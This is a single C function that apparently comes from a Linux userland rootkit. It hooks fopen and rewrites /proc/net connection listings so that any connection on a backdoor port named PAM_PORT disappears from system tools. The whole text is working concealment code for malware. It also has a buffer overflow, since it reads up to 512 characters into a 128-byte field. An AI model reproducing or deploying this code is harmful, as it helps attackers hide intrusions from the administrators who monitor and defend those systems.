FILE *forge_procnet(const char *pathname)
{
    HOOK(o_fopen,CFOPEN);
    FILE *tmp, *pnt=o_fopen(pathname,"r");
    if((tmp=tmpfile()) == NULL) return pnt;

    unsigned long rxq,txq,t_len,retr,inode;
    int lport,rport,d,state,uid,t_run,tout;
    char line[LINE_MAX],raddr[128],laddr[128],etc[128];

    char *pnetstr="%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n";
    while(fgets(line, LINE_MAX, pnt) != NULL)
    {
        sscanf(line, pnetstr, &d, laddr, &lport, raddr, &rport, &state, &txq,
                              &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
                              etc);
        if(lport != PAM_PORT && rport != PAM_PORT) fputs(line,tmp);
    }
    fclose(pnt);
    if(tmp != NULL) fseek(tmp,0,SEEK_SET);
    return tmp;
}
